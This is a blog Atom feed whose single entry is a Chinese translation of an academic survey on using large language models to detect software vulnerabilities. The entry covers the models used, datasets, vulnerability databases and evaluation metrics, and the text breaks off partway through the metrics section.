<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>HaCky的安全备忘录</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://findream.github.io/"/>
  <updated>2025-11-27T04:57:13.014Z</updated>
  <id>https://findream.github.io/</id>
  
  <author>
    <name>HaCky</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>LLMs在软件安全中的应用：漏洞检测技术综述与洞察</title>
    <link href="https://findream.github.io/2025/11/08/LLMs%E5%9C%A8%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8%EF%BC%9A%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E6%8A%80%E6%9C%AF%E7%BB%BC%E8%BF%B0%E4%B8%8E%E6%B4%9E%E5%AF%9F/"/>
    <id>https://findream.github.io/2025/11/08/LLMs在软件安全中的应用：漏洞检测技术综述与洞察/</id>
    <published>2025-11-08T07:02:11.000Z</published>
    <updated>2025-11-27T04:57:13.014Z</updated>
    
    <content type="html"><![CDATA[<h3 id="LLMs在软件安全中的应用：漏洞检测技术综述与洞察"><a href="#LLMs在软件安全中的应用：漏洞检测技术综述与洞察" class="headerlink" title="LLMs在软件安全中的应用：漏洞检测技术综述与洞察"></a>LLMs在软件安全中的应用：漏洞检测技术综述与洞察</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;本文翻译自：<llms in="" software="" security:="" a="" survey="" of="" vulnerability="" detection="" techniques="" and="" insights="">，原文地址为<a href="https://arxiv.org/abs/2502.07049" target="_blank" rel="external">https://arxiv.org/abs/2502.07049</a></llms></p><h3 id="作者：​​"><a href="#作者：​​" class="headerlink" title="作者：​​"></a>作者：​​</h3><ul><li>ZE SHENG，德克萨斯A&amp;M大学，美国</li><li>ZHICHENG CHEN，德克萨斯A&amp;M大学，美国</li><li>SHUNING GU，德克萨斯A&amp;M大学，美国</li><li>HEQING HUANG，香港城市大学，中国</li><li>GUOFEI GU，德克萨斯A&amp;M大学，美国</li><li>JEFF HUANG，德克萨斯A&amp;M大学，美国</li></ul><h3 id="摘要：​​"><a href="#摘要：​​" class="headerlink" title="摘要：​​"></a>摘要：​​</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;大语言模型（LLMs）正在成为软件漏洞检测的变革性工具。传统方法（包括静态和动态分析）在现代软件复杂性面前面临效率、误报率和可扩展性的限制。通过代码结构分析、模式识别和修复建议生成，LLMs展示了一种新的漏洞缓解方法。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;本综述探讨了LLMs在漏洞检测中的应用，分析了问题表述、模型选择、应用方法、数据集和评估指标。我们调查了当前的研究挑战，强调跨语言检测、多模态集成和仓库级分析。基于我们的发现，我们提出了解决数据集可扩展性、模型可解释性和低资源场景的解决方案。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;我们的贡献包括：（1）对LLMs在漏洞检测中应用的系统分析；（2）检查研究间模式和变化的统一框架；（3）关键挑战和研究方向的识别。这项工作推进了对基于LLM的漏洞检测的理解。最新发现维护于<a href="https://github.com/OwenSanzas/LLM-For-Vulnerability-Detection" target="_blank" rel="external">https://github.com/OwenSanzas/LLM-For-Vulnerability-Detection</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;附加关键词和短语：​​ 大语言模型、漏洞检测、网络安全</p><h2 id="1-引言"><a href="#1-引言" class="headerlink" title="1 引言"></a>1 引言</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;漏洞检测在现代软件的设计和维护中扮演着重要角色。统计数据显示，约70%的安全漏洞源于软件开发过程中的缺陷[4]。根据CVE编号机构（CNAs）提供的指标，过去5年中约有120,000个CVE被发现和报告[20]。根据图1中FBI的网络犯罪报告，2018年至2023年期间遭受了大量网络犯罪和投诉。最近的一个例子是2024年7月的CrowdStrike事件[110]，其中一个有缺陷的软件更新导致医疗、交通和金融等关键基础设施部门广泛系统崩溃。因此，需要加强对漏洞检测技术的关注和投资。</p><p><img src="http://hacky.wang/blog/20251024/rwwydLtW6eOx.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;最先进的漏洞检测方法/工具大致可分为静态分析和动态分析[18, 76, 100, 133]。静态分析检查源代码或字节码以识别潜在安全漏洞，而动态分析在程序执行期间进行，包括模糊测试[102]等技术。模糊测试通过向应用程序输入随机或特定无效数据并观察系统响应来识别潜在漏洞。然而，随着软件系统规模的增加，传统静态和动态分析方法都有明显的局限性。例如，静态和动态分析工具存在高误报率、低效率以及面对大量漏洞类型时需要大量投入的问题[54, 112]。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;大语言模型（LLMs）作为自然语言处理（NLP）的进步，通过深度学习技术（特别是Transformer架构）训练，专注于各种NLP任务[111]。最近，LLMs在软件开发领域显示出卓越能力[51]。基于这些能力，研究人员提出了几种LLM驱动的漏洞检测方法和工具。这一新趋势吸引了网络安全专家和机器学习研究人员的关注，可能彻底改变这一领域。例如，2024年DARPA举办了人工智能网络挑战赛（AIxCC），参赛者仅利用通用LLMs（GPT系列、Claude系列和Gemini系列）进行漏洞检测、复现和修补[22]。该比赛汇集了全球网络安全和机器学习领域的领先专家，表明将LLMs应用于漏洞检测的巨大潜力。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;LLMs在漏洞检测中的应用日益增多，从AIxCC等倡议中可见一斑，展示了其能力的快速演进和该领域方法的多样性。尽管兴趣日益增长且研究投入显著，但仍缺乏系统性的综述来彻底检查基于LLM的检测方法。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;本文通过提出首个专注于理解LLMs在漏洞检测中优势和劣势的全面综述来填补这一空白。为提供结构化和整体分析，我们围绕四个关键方面构建综述：（1）识别适用于安全任务的有效LLM架构；（2）评估可靠评估的基准、数据集和指标；（3）分析技术以揭示最佳实践；（4）识别挑战以指导未来研究方向。这些方面共同突出了该领域的现状及其进步潜力。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;基于这些方面，我们关注以下研究问题（RQs）：</p><ul><li>RQ1. 哪些LLMs已被应用于漏洞检测？</li><li>RQ2. 设计了哪些基准、数据集和指标来评估漏洞检测？</li><li>RQ3. LLM用于漏洞检测使用了哪些技术？</li><li>RQ4. LLMs在检测漏洞时面临哪些挑战及解决它们的潜在方向？</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;为分析和总结RQs，我们从500多篇论文中筛选了80多篇（其中58篇高度相关），以确保时效性（2019-2024年）和相关性（专注于LLMs在漏洞检测中的应用）。因此，本综述将不讨论2014年至2020年间主要使用的传统机器学习方法（传统CNN、RNN和LSTM）在漏洞检测中的应用。<br>总的来说，我们的关键发现可以总结为积极方面和关键差距:</p><ul><li><p>积极方面：网络安全社区经历了LLM带来的积极影响，近年来发表文章大幅增加便是明证。贡献涵盖多个领域，包括漏洞定位、检测和分析。C、Java和Solidity已成为该领域的主要焦点。研究方法始终强调三个关键组成部分：LLM实现、提示工程和语义处理方法。此外，多智能体方法因将复杂漏洞检测挑战分解为可管理的子问题而被广泛使用。</p></li><li><p>关键差距：​​</p><ul><li>范围狭窄和仓库级覆盖有限：当前工作通常局限于小型专业数据集中函数级漏洞的二元分类。此外，很少有研究解决仓库级的漏洞检测和复现，其中跨文件依赖和长调用栈带来了重大挑战。</li><li>前沿LLMs的快速进展：2023-2024年的突破表明，微调和利用前沿LLMs对未来进展至关重要，但迄今为止大多数研究仍依赖能力较弱的传统模型。</li><li>上下文意识不足：对复杂、多文件依赖和长调用栈的关注不足。尽管神经符号方法（如CodeQL、Bear与LLMs结合）在大规模项目上显示出潜力，但仍需要改进污点传播建模、更高效的LLM推理和跨语言适应。</li><li>漏洞类型不平衡：内存相关漏洞（如缓冲区溢出问题）的检测准确率不成比例地高，而逻辑漏洞仍然相对未被充分探索。</li><li>数据集限制：现有数据集范围狭窄且存在数据泄露问题。迫切需要专门为基于LLM的漏洞检测量身定制的专用综合数据集，以推动基础和应用研究。</li></ul></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;以下各节对LLMs在漏洞检测中的应用进行了全面分析。鉴于本综述的广泛范围，本节概述了我们分析的结构、主题和叙述流程。本文结构的可视化如图2所示</p><p><img src="http://hacky.wang/blog/20251024/ivFqO86FW5kC.png?imageslim" alt="mark"></p><h2 id="2-背景"><a href="#2-背景" class="headerlink" title="2 背景"></a>2 背景</h2><h3 id="2-1-论文选择与范围"><a href="#2-1-论文选择与范围" class="headerlink" title="2.1 论文选择与范围"></a>2.1 论文选择与范围</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;为确保全面系统回顾，我们首先检索了顶级安全会议，如IEEE安全与隐私研讨会（S&amp;P）、USENIX Security和ACM计算机与通信安全会议（CCS），以及期刊如IEEE软件工程汇刊。然后，我们通过提取会议和期刊论文中的关键词（如”漏洞检测”、”LLM”、”大语言模型”和”AI”）进行搜索。使用这些关键词，我们每三周进行一次迭代搜索，随时间推移优化选择。在两个月内，我们筛选了约500-600篇论文，并选择了58篇高度相关的研究。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;本综述仅关注LLMs在漏洞检测中的应用，分析技术、数据集、基准和挑战。我们回顾了针对C/C++、Java和Solidity等编程语言的工作，这些是基于LLM的漏洞检测的主要焦点领域。专注于传统机器学习方法（如CNN和RNN）的研究，以及与漏洞检测无关的研究（如恶意软件分析或网络入侵检测）被排除在外。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;在数据集方面，我们主要评估函数级和文件级粒度，注意到C/C++数据集在该领域占主导地位。然而，更好地反映现实开发场景的仓库级数据集显著缺乏。这一限制对LLMs泛化到复杂、多文件漏洞提出了挑战。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;通过明确定义范围并采用严格的关键词驱动选择过程，我们旨在确保本综述的稳健性和相关性，同时为未来研究奠定坚实基础。</p><h3 id="2-2-相关综述"><a href="#2-2-相关综述" class="headerlink" title="2.2 相关综述"></a>2.2 相关综述</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;过去五年中，许多研究提出了利用LLMs进行漏洞检测的方法。已有几篇关于漏洞检测技术的全面综述，涵盖了传统方法（静态/动态分析）和机器学习方法（CNN、RNN）[4, 15, 27, 134, 146]。但它们并未具体涉及LLMs在漏洞检测中的集成。Yao等人[129]回顾了LLMs在安全和隐私领域的应用，提出了其积极影响、潜在威胁和固有威胁。然而，他们的分析侧重于对这些问题的广泛概述，而非提供基于LLM的检测方法的方法论总结。Xu等人[124]概述了LLMs在整个网络安全领域的应用，包括恶意软件分析、网络入侵检测等。我们的综述特别关注基于LLM的漏洞检测，并对技术和方法进行了更详细的总结。同时，Zhou等人[140]调查了LLMs如何适应漏洞检测和修复。虽然他们的工作提供了宝贵见解，但我们的综述在几个方面有所不同：（1）截至撰写时，OpenAI和Anthropic都发布了更强大的LLMs（GPT-4o、o1和Claude 3.5 Sonnet），具有更强的推理能力和更大的上下文窗口；（2）我们对基于LLM的漏洞检测系统的基准和评估指标进行了全面分析；（3）我们更关注漏洞检测和理解的细节。</p><h3 id="2-3-大语言模型（LLMs）"><a href="#2-3-大语言模型（LLMs）" class="headerlink" title="2.3 大语言模型（LLMs）"></a>2.3 大语言模型（LLMs）</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;大语言模型（LLMs）已成为语言模型进化中的重要进展[138]。Transformer架构实现了前所未有的扩展能力。LLMs以其大规模为特征，通常包含在庞大语料库上训练的数千亿参数。因此，它在通用人类任务中带来了卓越能力[21]。</p><h3 id="2-4-漏洞检测问题"><a href="#2-4-漏洞检测问题" class="headerlink" title="2.4 漏洞检测问题"></a>2.4 漏洞检测问题</h3><h4 id="2-4-1-领域知识"><a href="#2-4-1-领域知识" class="headerlink" title="2.4.1 领域知识"></a>2.4.1 领域知识</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;一些流行的漏洞数据库，如通用缺陷枚举（<a href="https://cwe.mitre.org/" title="CWE" target="_blank" rel="external">CWE</a>）¹、通用漏洞披露（<a href="https://www.cve.org/" title="CVE" target="_blank" rel="external">CVE</a>）²、通用漏洞评分系统（<a href="https://www.first.org/cvss/" title="CVSS" target="_blank" rel="external">CVSS</a>）³和国家漏洞数据库（<a href="https://nvd.nist.gov/" title="NVD" target="_blank" rel="external">NVD</a>）⁴，已被建立以记录常见漏洞的定义和评估。CWE关注软件开发生命周期（从开发到维护）中的所有漏洞。CWE不关注特定的现实世界安全漏洞（如Heartbleed和Log4Shell），而是关注这些现实世界漏洞的根本原因，如释放后使用（CWE-416）和越界写入（CWE-787）。CVE是一个识别和分类软件和硬件中安全漏洞的公共社区。该社区为每个现实世界漏洞分配唯一标识符。例如，Log4Shell的标识符是CVE-2021-44228。CVSS是一个通过多项指标（可利用性、影响、利用代码成熟度和修复级别等）评估漏洞风险级别的标准化框架。这些指标产生一个0到10的整体分数，严重性从低到严重。Log4Shell的CVSS分数为10（严重性：严重）。NVD是一个包含现实世界漏洞基本信息的数据库，如CVE标识符、漏洞技术细节、CVSS分数和缓解建议。例如，NVD记录Log4Shell可通过构造恶意JNDI语句远程在受害服务器上执行代码，这是由不当输入验证（CWE-20）和不受控制的资源消耗（CWE-400）引起的。</p><h4 id="2-4-2-漏洞检测"><a href="#2-4-2-漏洞检测" class="headerlink" title="2.4.2 漏洞检测"></a>2.4.2 漏洞检测</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;漏洞检测是本综述中所有选定论文的核心焦点，代表了LLMs在软件安全中的主要应用。基本任务可以形式化定义为二元分类问题：<br>令 C<br>i<br>​<br> 表示输入源代码，VD<br>i<br>​<br> 代表LLM驱动的漏洞检测器。输出 Y<br>i<br>​<br> ∈{0,1}表示漏洞状态，其中 Y<br>i<br>​<br> =1表示代码存在漏洞，Y<br>i<br>​<br> =0表示代码无漏洞。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;图3显示了大多数选定研究中漏洞检测的示例工作流程，以及两个子问题：漏洞分类和严重性预测。<br><img src="http://hacky.wang/blog/20251029/gePX0blyLeyy.png?imageslim" alt="mark"></p><h4 id="2-4-3-漏洞分类"><a href="#2-4-3-漏洞分类" class="headerlink" title="2.4.3 漏洞分类"></a>2.4.3 漏洞分类</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;除了二元检测，一些研究探索LLMs在多类漏洞分类中的能力，以增强模型可靠性。此任务要求LLMs不仅识别漏洞存在，还根据CWE等既定标准确定其具体类型。<br>形式化上，漏洞分类可定义为：令 C<br>i<br>​<br> 表示输入源代码，VCi代表LLM驱动的漏洞分类器。输出Yi表示特定漏洞类型：Y<br>2<br>​<br> =VC<br>i<br>​<br> (C<br>i<br>​<br> )∈{type<br>1<br>​<br> ,type<br>2<br>​<br> ,…,type<br>n<br>​<br> }，其中typei可以是漏洞名称（如缓冲区溢出、SQL注入）或标准化标识符（如CWE-119、CWE-89）。<br>例如，在检查代码片段时，LLM可能不仅检测到其存在漏洞，还将其分类为”CWE-79：跨站脚本（XSS）”，为安全缓解提供更详细指导。</p><h4 id="2-4-4-漏洞严重性预测"><a href="#2-4-4-漏洞严重性预测" class="headerlink" title="2.4.4 漏洞严重性预测"></a>2.4.4 漏洞严重性预测</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;一些研究将漏洞分析扩展到包括严重性预测以及检测。这可以表述为多类分类问题或回归任务，取决于严重性测量的粒度。形式化上，令Ci表示输入源代码，VSi代表LLM驱动的严重性预测器。输出Y可以定义为两种形式：它可能表示基于输入源代码C的漏洞严重性级别的严重性分数，如”低”、”中”或”高”。不同研究采用了不同的严重性预测方法：</p><ul><li><strong>分类分类</strong>：​​ Alam等人[2]采用三级分类系统（高、中、低）进行直接严重性评估。</li><li><strong>分数预测</strong>：​​ Fu等人[35]要求LLMs预测0到10的数值CVSS分数，提供更精确的严重性测量。<br>这种额外的严重性信息有助于在实际应用中优先排序漏洞修复工作和更有效地分配安全资源。<br><img src="http://hacky.wang/blog/20251029/Eq26AuqehPBD.png?imageslim" alt="mark"></li></ul><h2 id="3-研究结果"><a href="#3-研究结果" class="headerlink" title="3 研究结果"></a>3 研究结果</h2><h3 id="3-1-概述"><a href="#3-1-概述" class="headerlink" title="3.1 概述"></a>3.1 概述</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;我们的分析显示，基于LLM的漏洞检测研究主要集中在C/C++、Java和Solidity上。每种语言都有独特的挑战和研究重点。C/C++研究关注内存相关漏洞，这在该领域至关重要。Java研究解决框架特定漏洞和Web应用程序中跨组件的复杂交互。Solidity研究针对智能合约中的漏洞，这对区块链安全至关重要。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;最近，大型仅解码器模型（如GPT和CodeLlama）因其规模化和强泛化能力成为主要选择。这些模型用于65%的微调实验。例如，Alam等人[2]微调了GPT-4，在Solidity漏洞检测中达到99%准确率。在此之前，仅编码器模型（如CodeBERT和GraphCodeBERT）被广泛使用。提示工程的进展也提高了检测性能。思维链提示现在常用于大型模型，并增强了它们对复杂代码的推理能力[24]。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;当前大多数数据集关注函数级和文件级漏洞，C/C++是主要目标语言。例子包括Devign[145]和CVEFixes[6]数据集。然而，缺乏更好反映现实场景的仓库级数据集。这一差距限制了LLMs在漏洞检测中的实际应用。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;未来研究应解决跨文件和复杂上下文漏洞检测中的挑战。应开发更好的代码语义表示方法，并创建现实的仓库级数据集。这些步骤将提高LLMs在该领域的适用性和可靠性。</p><h3 id="3-2-RQ1-哪些LLMs已被应用于漏洞检测？"><a href="#3-2-RQ1-哪些LLMs已被应用于漏洞检测？" class="headerlink" title="3.2 RQ1. 哪些LLMs已被应用于漏洞检测？"></a>3.2 RQ1. 哪些LLMs已被应用于漏洞检测？</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;本文中，我们使用Pan等人[94]概述的LLM分类和分类法，将主要LLMs分为三组架构：1）仅编码器，2）编码器-解码器，和3）仅解码器模型。由于空间限制，我们将简要介绍每个类别中的一些代表性LLMs。表1基于其固有能力和局限性，清晰概述了每类方法的优缺点。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<strong>仅编码器LLMs</strong>。​​ 仅编码器LLMs仅使用Transformer模型的编码器组件[94]。这些模型专门设计用于分析和表示代码或语言上下文，而不生成输出序列，使其非常适合需要详细理解语法和语义的任务。通过使用注意力机制，仅编码器模型将输入序列编码为捕获基本语法和语义信息的结构化表示[47]。在软件工程（SE）领域，仅编码器模型如CodeBERT[30]、GraphCodeBERT[43]、CuBERT[55]、VulBERTa[45]、CCBERT[142]、SOBERT[50]和BERTOverflow[107]已被广泛使用。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<strong>编码器-解码器LLMs</strong>。​​ 编码器-解码器模型结合了Transformer模型的编码器和解码器组件，使其能够处理需要理解和生成序列的任务。编码器处理输入序列，将其转换为结构化表示，然后解码以产生输出序列。这种结构使编码器-解码器模型适用于涉及翻译、总结或转换文本或代码的任务。著名例子包括PLBART[1]、T5[98]、CodeT5[117]、UniXcoder[42]和NatGen[14]。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<strong>仅解码器LLMs</strong>。​​ 仅解码器LLMs专注于Transformer架构的解码器组件，以基于输入提示生成文本或代码。这种方法利用模型解释和扩展上下文的能力，使其通过预测后续标记来产生复杂连贯的序列。广泛采用于强调生成的任务，如漏洞检测和代码建议，仅解码器模型在识别代码中的相关模式和潜在问题方面表现出色。此类别中的著名例子包括GPT系列（GPT-2[97]、GPT-3[9]、GPT-3.5[91]、GPT-4[92]），以及专门为软件工程中的代码定制的模型，如CodeGPT[78]、Codex[16]、Polycoder[123]、Incoder[34]、CodeGen系列[90]、Copilot[40]、Code Llama[99]和StarCoder[64]。[143]</p><p>&nbsp;&nbsp;&nbsp;&nbsp;在分析58项漏洞检测研究时，我们识别了33种不同的LLMs用于各种任务。GPT-4成为最常用的模型，出现29次，其次是GPT-3.5，被提及25次。在类别中，仅编码器模型占总使用量的24.2%，其中CodeBERT、GraphCodeBERT、UniXcoder和BERT是突出例子。编码器-解码器模型（包括CodeT5）占使用量的8.7%，在代码生成和理解中扮演双重角色。仅解码器模型（如GPT系列、CodeLlama、StarCoder和WizardCoder）占总使用量的67.1%，主要应用于代码生成任务。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;此外，表2展示了漏洞检测研究中最常用的前10种LLMs的架构和出现次数。它显示此任务的模型大多是仅解码器架构，表明该结构在检测任务中的广泛使用。尽管该领域普遍趋势通常偏爱仅编码器架构进行理解任务，但此表表明仅解码器模型也被广泛采用进行检测，可能因为其在代码分析中处理和生成相关序列的效率。<br><img src="http://hacky.wang/blog/20251029/O2He0jMsNWsI.png?imageslim" alt="mark"><br><img src="http://hacky.wang/blog/20251029/zWpofvf9aAxj.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;在所有LLMs中，GPT系列（尤其是GPT-4系列）因其在理解和生成代码方面的强大能力而表现一致良好。GPT-4被广泛认为适用于高级应用，如漏洞检测和代码分析，而GPT-3和GPT-3.5常在实证研究中作为基线或基准。专门模型（如CodeBERT和CodeT5）常用于涉及代码理解和处理的微调任务。一些研究结合多个模型，如将GPT-4与GPT-3.5配对，以评估比较性能或执行互补任务。这种集成方法结合通用LLMs和专门模型（如CodeBERT），利用了LLMs的泛化能力和专门模型的任务特定精度，从而提高了性能和多功能性。</p><p><strong>RQ1答案​</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;最近趋势显示研究从仅编码器模型转向大型仅解码器架构（如GPT和CodeLlama系列）。虽然仅编码器模型仍主导非微调研究（72.4%），但仅解码器模型占微调实验的65%。仅编码器和编码器-解码器架构日益被定位为比较的基线模型。</p><h3 id="3-3-RQ2-设计了哪些基准、数据集和指标来评估漏洞检测？"><a href="#3-3-RQ2-设计了哪些基准、数据集和指标来评估漏洞检测？" class="headerlink" title="3.3 RQ2. 设计了哪些基准、数据集和指标来评估漏洞检测？"></a>3.3 RQ2. 设计了哪些基准、数据集和指标来评估漏洞检测？</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;本节中，我们将首先检查不同编程语言和关键软件系统中漏洞的分布。然后我们将讨论该领域常用的基准、数据集和指标。由于设计和特性的差异，如C/C++中的内存管理、Python中的不安全反序列化以及Java中的对象注入和反射，不同编程语言具有不同类型的高发漏洞。这尤其重要，因为许多关于LLMs漏洞检测的研究关注语言特定挑战[31, 66, 131]。理解这些细微差别对于评估和提高不同上下文中漏洞检测的有效性至关重要。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;我们分析了过去五年（2019-2024年）主要软件系统中的CVE统计，如表3所示。<br><img src="http://hacky.wang/blog/20251030/qGHTUi62APGg.png?imageslim" alt="mark"></p><ul><li>数据截至2024年11月3日从NVD数据库收集</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;表3揭示了不同软件系统中漏洞分布的几种有趣模式。操作系统（Android、MacOS X、Linux内核和Windows Server）主导漏洞格局，其次是Web浏览器（Chrome和Firefox）和开发平台（Gitlab）。根据CVE统计[20]，内存相关漏洞是过去五年中最普遍的类型。作为内存不安全但广泛使用的编程语言，C/C++导致了大量内存损坏漏洞，使得漏洞检测日益紧迫。基于我们对56篇选定论文的分析，我们收集了所有目标编程语言的统计，如图5所示。<br><img src="http://hacky.wang/blog/20251030/VjV27ppXcXnr.png?imageslim" alt="mark"></p><p><strong>发现一</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;研究格局显示目标编程语言有清晰分布：C/C++以50%的研究占主导，其次是Java占21.1%。Solidity因在智能合约和金融交易中的关键作用占研究的11.8%。剩余的16.6%覆盖其他语言，包括Python、PHP和Go。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;C/C++仍然是漏洞检测的主要焦点，覆盖50%的研究。这一高比例反映了C/C++项目中常见的内存相关漏洞。Java以21.1%排名第二，部分原因是因为其在企业级软件和Android开发中的流行（表3显示Android贡献了大量CVE）。Java的类型系统和字节码格式也为LLMs提供了详细信息，其Web应用程序常面临SQL注入、跨站脚本（XSS）或不安全反序列化。Solidity以11.8%跟随，因为智能合约中的漏洞直接威胁区块链平台上的金融安全。剩余的16.6%包括Python、PHP和Go等语言。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;为微调LLMs并测量其在漏洞检测中的性能，研究人员引入了各种数据集，包括BigVul[28]、CVEfixes[6]和Devign[145]。每个数据集针对不同规模，从识别单个函数是否存在漏洞到扫描整个GitHub仓库。这种变化反映了漏洞检测任务的多样化需求。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<strong>函数级</strong>。​​ 这些数据集的每个数据包含以下属性：函数实现（通常包括修复前和修复后的实现）、漏洞标志（通常1表示有漏洞，0表示无漏洞）。此类常用数据集是BigVul[28]和Devign[145]（也称为FFmpeg和QEMU数据集）。这些数据集通常用于微调大型模型和评估LLMs检测漏洞的能力，但它们不太实用。原因是现实世界漏洞通常由跨文件的多个函数引起。</p><p>​​&nbsp;&nbsp;&nbsp;&nbsp;<strong>文件级</strong>。​​ 一些数据集不仅在函数级别结构化，还在文件级别结构化，如Juliet C/C++[32]和Java[33]测试套件。Juliet测试套件中的一些漏洞在很大程度上模仿了现实世界漏洞的结构，包括但不限于跨文件函数调用或跨文件访问全局变量。这种具有复杂上下文的漏洞为LLM检测漏洞带来了重大挑战。Juliet C/C++测试套件的测试用例501129如图6所示。我们可以看到，在测试用例501129中，引入漏洞的文件和行已在跟踪中标记。这一细节为LLMs检测跨文件引入漏洞的能力提供了线索，但也表明需要提高LLMs检测跨文件漏洞的能力。<br><img src="http://hacky.wang/blog/20251030/1Be2tqaue66z.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;<strong>提交级</strong>。​​ 许多开源软件使用GitHub平台并通过提交提交修改源代码。显然，受信任的维护者可以提交包含恶意更改的提交，使目标软件易受攻击[120]。因此，也需要对每个提交应用漏洞检测。CVEfixes[6]和Pan2023[93]都是提交级数据集。这些数据集通常包括仓库URL、提交哈希（每个提交的唯一标识符）和差异文件（显示提交前后的差异）。通过这种方式，LLMs可以分析提交前后的代码更改以确定提交是否有漏洞，并通过仓库URL获取上下文信息。</p><p>​​&nbsp;&nbsp;&nbsp;&nbsp;<strong>仓库级和应用级</strong>。​​ 这些类型的数据集通常用于整个项目的漏洞检测。CWE-Bench-Java[66]是专注于Java项目的仓库级数据集。每个仓库附带有关漏洞的元数据，如CWE ID、CVE ID、修复提交和漏洞版本。这使得分析和验证更加系统和可靠。Ghera[87]是应用级数据集。每个项包含三个应用程序：一个包含漏洞X的易受攻击应用程序、一个可以使用漏洞X攻击易受攻击应用程序的恶意应用程序，以及一个没有漏洞X的安全应用程序。每个项附带构建和运行应用程序的指令，以演示漏洞及其利用，从而验证漏洞的存在与否和利用。提交级数据集的示例如图7所示。<br><img src="http://hacky.wang/blog/20251030/egdNHx332EBX.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;还有其他类型的数据集。例如，随着区块链的兴起，已经建立了智能合约的数据集。这些数据集，如FELLMVP[79]，包含许多具有逻辑漏洞（如重入攻击和整数溢出/下溢）的智能合约（合约级）。也有只关注特定漏洞的数据集。例如，Code Gadgets[69]只关注C/C++程序中的两种漏洞类型：缓冲区错误漏洞（CWE-119）和资源管理错误漏洞（CWE-399）。SolidFi[38]只基于注入漏洞。表4显示了漏洞检测中常用的数据集。括号中的数字表示易受攻击项的数量。<br><img src="http://hacky.wang/blog/20251030/cQvE6o9I0heT.png?imageslim" alt="mark"></p><ul><li><p>括号中的数字表示易受攻击项的数量。例如，BigVul数据集中共有264,919个函数，其中11,823个易受攻击。</p></li><li><p>“N/A”表示作者在论文中未提供漏洞数量的详细信息。</p></li></ul><p><strong>发现二</strong></p><p>​​<br>&nbsp;&nbsp;&nbsp;&nbsp;当前漏洞数据集存在两个主要限制：（1）语言不平衡——C/C++约占60%的覆盖范围，而Java尽管在企业级和Android开发中广泛使用，但缺乏全面的数据集；（2）范围差距——严重缺乏反映现实世界开发场景的仓库级数据集，其中漏洞通常跨越多个文件和依赖关系。这种现实、大规模仓库数据集的稀缺对LLMs在漏洞检测中的实际应用构成了关键限制。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;LLM-based漏洞检测系统的评估需要多个指标。这些指标可分为三组：分类指标、生成指标和效率指标。</p><h4 id="3-3-1-评估指标"><a href="#3-3-1-评估指标" class="headerlink" title="3.3.1 评估指标"></a>3.3.1 评估指标</h4><h4 id="3-3-2-分类指标"><a href="#3-3-2-分类指标" class="headerlink" title="3.3.2 分类指标"></a>3.3.2 分类指标</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;漏洞检测系统常用几个标准指标：<br><img src="http://hacky.wang/blog/20251030/jjz54rO2ccd4.png?imageslim" alt="mark"></p><h4 id="3-3-3-生成和可解释性指标"><a href="#3-3-3-生成和可解释性指标" class="headerlink" title="3.3.3 生成和可解释性指标"></a>3.3.3 生成和可解释性指标</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;为评估生成的漏洞描述质量，Alam等人和Ghosh等人[2, 